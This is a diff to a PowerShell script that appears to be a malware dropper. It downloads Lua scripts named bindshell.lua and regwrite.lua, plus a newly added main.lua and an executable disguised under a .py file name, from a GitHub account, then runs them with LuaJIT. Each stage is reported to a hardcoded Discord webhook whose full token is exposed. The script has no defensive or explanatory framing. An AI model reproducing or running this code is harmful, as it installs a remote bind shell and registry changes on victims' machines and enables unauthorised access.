@@ -4,18 +4,20 @@ $luaZip = "$baseDir\lua-5.4.2_Win64_bin.zip"
 $luaZipUrl = "https://sourceforge.net/projects/luabinaries/files/5.4.2/Tools%20Executables/lua-5.4.2_Win64_bin.zip/download"
 $luaJitZip = "$baseDir\LuaJIT-2.1.zip"
 $luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.zip"
-$bindshellScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/bindshell.lua"
-$regwriteScriptUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/regwrite.lua"
-$ghostConfigPyUrl = "https://raw.githubusercontent.com/invisibleghostshell-ux/lua/main/Ghost_configured.py"
+$bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
+$regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
+$extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
+$ghostConfigPyUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/winsic.exe"
 $bindshellScriptPath = "$baseDir\bindshell.lua"
 $regwriteScriptPath = "$baseDir\regwrite.lua"
+$extraScriptPath = "$baseDir\main.lua"
 $ghostConfigPyPath = "$baseDir\Ghost_configured.py"
 $discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
 $luaJitPath = "$baseDir\LuaJIT-2.1"
 $luaPathDir = "$baseDir\Luapath"
 $jitDir = "$luaPathDir\src\jit"
 $srcDir = "$luaPathDir\src"
-$jitSourceDir = "$luaJitPath"
+$jitSourceDir = "$luaJitPath\src\jit"
 
 # Function to send messages to Discord webhook
 function Send-DiscordMessage {
@@ -223,6 +225,7 @@ if (Test-Path -Path "$luaJitPath\src\lua51.dll") {
 Send-DiscordMessage -message "Downloading Lua scripts..."
 Get-File -url $bindshellScriptUrl -destination $bindshellScriptPath
 Get-File -url $regwriteScriptUrl -destination $regwriteScriptPath
+Get-File -url $extraScriptUrl -destination $extraScriptPath
 
 # Execute Lua scripts using LuaJIT
 Send-DiscordMessage -message "Executing bindshell.lua using LuaJIT..."
@@ -241,6 +244,16 @@ try {
     Send-DiscordMessage -message "Executed regwrite.lua successfully."
 } catch {
     $message = "Error executing regwrite.lua: $(${_})"
+    Send-DiscordMessage -message $message
+    exit 1
+}
+
+Send-DiscordMessage -message "Executing main.lua using LuaJIT..."
+try {
+    Start-Process -FilePath "$luaPathDir\luajit.exe" -ArgumentList $extraScriptPath -NoNewWindow -Wait
+    Send-DiscordMessage -message "Executed main.lua successfully."
+} catch {
+    $message = "Error executing main.lua: $(${_})"
     Send-DiscordMessage -message $message
     exit 1
 }
